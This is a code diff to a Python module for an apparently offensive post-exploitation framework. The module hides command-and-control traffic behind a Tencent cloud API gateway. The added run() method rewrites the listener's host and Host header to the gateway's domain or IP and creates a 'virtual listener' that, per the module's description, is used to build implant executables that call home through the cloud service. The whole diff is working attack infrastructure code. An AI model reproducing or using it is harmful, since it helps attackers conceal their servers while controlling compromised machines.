@@ -8,7 +8,7 @@ from Lib.ModuleAPI import *
 
 
 class PostModule(PostPythonModule):
-    NAME = "腾讯API网关C2隐藏"
+    NAME = "利用云函数上线(腾讯API网关)"
     DESC = "模块会根据现有的监听配置及用户输入的API网关自动生成一个虚拟监听,用户可以使用该虚拟监听直接生成exe来进行上线"
     MODULETYPE = TAG2CH.Resource_Development
 
@@ -22,7 +22,7 @@ class PostModule(PostPythonModule):
     OPTIONS = register_options([
         OptionHander(),
         OptionStr(name='apiserver', name_tag="API网关公网域名", required=True, desc="填写API网关的公网域名"),
-        OptionStr(name='apiip', name_tag="API网关公网IP地址", required=True, desc="使用IP地址上线时填写此信息"),
+        OptionStr(name='apiip', name_tag="API网关公网IP地址", desc="使用IP地址上线时填写此信息"),
     ])
 
     def __init__(self, sessionid, ipaddress, custom_param):
@@ -42,4 +42,21 @@ class PostModule(PostPythonModule):
 
     def run(self):
         handler_config = self.get_handler_config()
-        pass
+        backendserver = f"https://{handler_config.get('LHOST')}:{handler_config.get('LPORT')}"
+        self.log_good(f"API网关中填写的后端地址: {backendserver}")
+        apiserver = self.param("apiserver")
+        apiserver = apiserver.replace(":80", "")
+        apiserver = apiserver.replace(":443", "")
+        apiserver = apiserver.replace("http://", "")
+        apiserver = apiserver.replace("https://", "")
+        apiserver = apiserver.strip()
+        apiip = self.param("apiip")
+        if apiip:
+            handler_config["LHOST"] = apiip
+            handler_config["HttpHostHeader"] = apiserver
+        else:
+            handler_config["LHOST"] = apiserver
+            handler_config["HttpHostHeader"] = apiserver
+        handler_config["VIRTUALHANDLER"] = True  # 添加虚拟监听
+        _, handler_config = self.create_handler(handler_config)
+        self.log_good(f"虚拟监听ID: {-handler_config.get('data').get('ID')}")
